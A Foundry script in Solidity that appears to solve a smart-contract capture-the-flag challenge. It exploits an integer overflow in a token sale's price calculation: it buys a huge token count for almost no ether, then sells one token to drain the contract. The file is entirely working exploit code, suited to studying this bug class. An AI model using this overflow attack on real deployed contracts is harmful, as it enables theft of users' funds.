// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface ITokenSale {
    function isComplete() external view returns (bool);

    function buy(uint256 numTokens) external payable;

    function sell(uint256 numTokens) external;
}

contract TokenSaleSolution is Script {
    ITokenSale private tokenSale = ITokenSale(vm.envAddress("ADDRESS"));
    uint256 min_num_tokens_with_overflow;

    function setUp() public {}

    function run() public {
        min_num_tokens_with_overflow = type(uint256).max / 1 ether + 1;
        uint256 value = min_num_tokens_with_overflow;
        unchecked {
            value *= 1 ether;
        }
        vm.startBroadcast();
        tokenSale.buy{value: value}(min_num_tokens_with_overflow);
        tokenSale.sell(1);
        vm.stopBroadcast();
        require(tokenSale.isComplete());
    }
}
